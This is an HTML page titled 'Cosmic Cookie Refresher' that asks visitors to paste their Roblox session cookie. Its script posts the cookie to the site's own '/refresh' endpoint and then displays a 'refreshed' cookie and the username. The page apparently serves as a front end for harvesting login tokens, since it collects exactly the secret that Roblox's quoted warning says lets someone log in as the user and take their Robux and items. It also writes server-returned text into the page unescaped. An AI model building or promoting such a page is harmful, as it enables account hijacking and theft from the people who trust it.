<!DOCTYPE html>
<html>
<head>
    <title>Cosmic Cookie Refresher</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a1a;
            color: #e0e0ff;
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.2) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(119, 198, 255, 0.2) 0%, transparent 50%);
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px 20px;
            position: relative;
            z-index: 1;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .title {
            font-size: 3.5em;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
        }

        .subtitle {
            font-size: 1.2em;
            color: #a0a0ff;
            opacity: 0.8;
        }

        .card {
            background: rgba(20, 20, 40, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(100, 100, 255, 0.3);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            font-size: 1.1em;
            color: #4ecdc4;
        }

        .cookie-input {
            width: 100%;
            height: 120px;
            background: rgba(10, 10, 30, 0.8);
            border: 1px solid rgba(100, 100, 255, 0.5);
            border-radius: 10px;
            padding: 15px;
            color: #e0e0ff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .cookie-input:focus {
            outline: none;
            border-color: #4ecdc4;
            box-shadow: 0 0 20px rgba(78, 205, 196, 0.3);
        }

        .refresh-btn {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            display: block;
            margin: 0 auto;
            position: relative;
            overflow: hidden;
        }

        .refresh-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
        }

        .refresh-btn:active {
            transform: scale(0.95);
        }

        .refresh-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .refresh-btn:hover::before {
            left: 100%;
        }

        .status {
            text-align: center;
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            font-weight: bold;
            transition: all 0.3s ease;
        }

        .status.ready {
            background: rgba(78, 205, 196, 0.1);
            border: 1px solid #4ecdc4;
            color: #4ecdc4;
        }

        .status.processing {
            background: rgba(255, 193, 7, 0.1);
            border: 1px solid #ffc107;
            color: #ffc107;
            animation: pulse 1.5s infinite;
        }

        .status.success {
            background: rgba(40, 167, 69, 0.1);
            border: 1px solid #28a745;
            color: #28a745;
        }

        .status.error {
            background: rgba(220, 53, 69, 0.1);
            border: 1px solid #dc3545;
            color: #dc3545;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .result-container {
            display: none;
            margin-top: 30px;
        }

        .result-title {
            color: #96ceb4;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .result-textarea {
            width: 100%;
            height: 100px;
            background: rgba(10, 10, 30, 0.9);
            border: 1px solid rgba(150, 206, 180, 0.5);
            border-radius: 10px;
            padding: 15px;
            color: #96ceb4;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            resize: vertical;
        }

        .user-info {
            background: rgba(69, 183, 209, 0.1);
            border: 1px solid #45b7d1;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
        }

        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid rgba(69, 183, 209, 0.3);
        }

        .info-label {
            color: #45b7d1;
        }

        .info-value {
            color: #e0e0ff;
            font-weight: bold;
        }

        .copy-btn {
            background: rgba(150, 206, 180, 0.2);
            color: #96ceb4;
            border: 1px solid #96ceb4;
            padding: 8px 20px;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
        }

        .copy-btn:hover {
            background: rgba(150, 206, 180, 0.3);
            transform: scale(1.05);
        }

        .nebula {
            position: fixed;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.1;
            z-index: -1;
        }

        .nebula-1 {
            background: #ff6b6b;
            top: 10%;
            left: 10%;
            animation: float 20s infinite linear;
        }

        .nebula-2 {
            background: #4ecdc4;
            bottom: 10%;
            right: 10%;
            animation: float 25s infinite linear reverse;
        }

        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(100px, 100px) rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Background Elements -->
    <div class="stars" id="stars"></div>
    <div class="nebula nebula-1"></div>
    <div class="nebula nebula-2"></div>

    <div class="container">
        <div class="header">
            <h1 class="title">üåå Cosmic Cookie Refresher</h1>
            <p class="subtitle">Advanced Authentication Ticket System</p>
        </div>

        <div class="card">
            <div class="input-group">
                <label class="input-label">üîê Paste Your Roblox Cookie:</label>
                <textarea class="cookie-input" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.C5FEC87931CC..."></textarea>
            </div>

            <button class="refresh-btn" onclick="refreshCookie()">
                üöÄ Refresh Cookie via Auth Ticket
            </button>

            <div id="status" class="status ready">
                ‚ö° Ready to refresh your cookie
            </div>
        </div>

        <div class="card result-container" id="resultContainer">
            <h3 class="result-title">‚úÖ Refreshed Cookie:</h3>
            <textarea class="result-textarea" id="newCookie" readonly></textarea>
            
            <button class="copy-btn" onclick="copyToClipboard()">
                üìã Copy to Clipboard
            </button>

            <div class="user-info" id="userInfo">
                <!-- User info will be populated here -->
            </div>
        </div>
    </div>

    <script>
        // Create stars background
        function createStars() {
            const starsContainer = document.getElementById('stars');
            const starCount = 200;
            
            for (let i = 0; i < starCount; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                
                const size = Math.random() * 2 + 1;
                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.left = `${Math.random() * 100}%`;
                star.style.top = `${Math.random() * 100}%`;
                star.style.animationDelay = `${Math.random() * 3}s`;
                
                starsContainer.appendChild(star);
            }
        }

        // Update status display
        function updateStatus(type, message) {
            const statusDiv = document.getElementById('status');
            statusDiv.className = `status ${type}`;
            statusDiv.innerHTML = message;
        }

        // Refresh cookie function
        async function refreshCookie() {
            const cookie = document.getElementById('cookieInput').value.trim();
            const resultContainer = document.getElementById('resultContainer');
            const userInfoDiv = document.getElementById('userInfo');
            
            if (!cookie) {
                updateStatus('error', '‚ùå Please enter a cookie');
                return;
            }

            updateStatus('processing', 'üîÑ Contacting Roblox authentication system...');
            resultContainer.style.display = 'none';

            try {
                const response = await fetch('/refresh', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ cookie: cookie })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'Unknown error occurred');
                }

                // Display results
                document.getElementById('newCookie').value = data.newCookie;
                
                // Update user info
                userInfoDiv.innerHTML = `
                    <div class="info-item">
                        <span class="info-label">üë§ Username:</span>
                        <span class="info-value">${data.username || 'Unknown'}</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">üìè Cookie Length:</span>
                        <span class="info-value">${data.length} characters</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">üîÑ Method:</span>
                        <span class="info-value">Authentication Ticket</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">üí´ Status:</span>
                        <span class="info-value">Successfully Refreshed</span>
                    </div>
                `;

                resultContainer.style.display = 'block';
                updateStatus('success', '‚úÖ Cookie refreshed successfully!');

                // Smooth scroll to results
                resultContainer.scrollIntoView({ behavior: 'smooth' });

            } catch (error) {
                updateStatus('error', `‚ùå Error: ${error.message}`);
                resultContainer.style.display = 'none';
            }
        }

        // Copy to clipboard function
        async function copyToClipboard() {
            const cookieText = document.getElementById('newCookie').value;
            
            try {
                await navigator.clipboard.writeText(cookieText);
                
                const copyBtn = document.querySelector('.copy-btn');
                const originalText = copyBtn.innerHTML;
                copyBtn.innerHTML = '‚úÖ Copied!';
                
                setTimeout(() => {
                    copyBtn.innerHTML = originalText;
                }, 2000);
                
            } catch (error) {
                updateStatus('error', '‚ùå Failed to copy to clipboard');
            }
        }

        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                e.preventDefault();
                refreshCookie();
            }
        });

        // Initialize
        createStars();
        
        // Add some interactive effects
        document.querySelector('.refresh-btn').addEventListener('mouseenter', function() {
            this.style.background = 'linear-gradient(45deg, #ff8e8e, #5ed5cc)';
        });
        
        document.querySelector('.refresh-btn').addEventListener('mouseleave', function() {
            this.style.background = 'linear-gradient(45deg, #ff6b6b, #4ecdc4)';
        });
    </script>
</body>
</html>
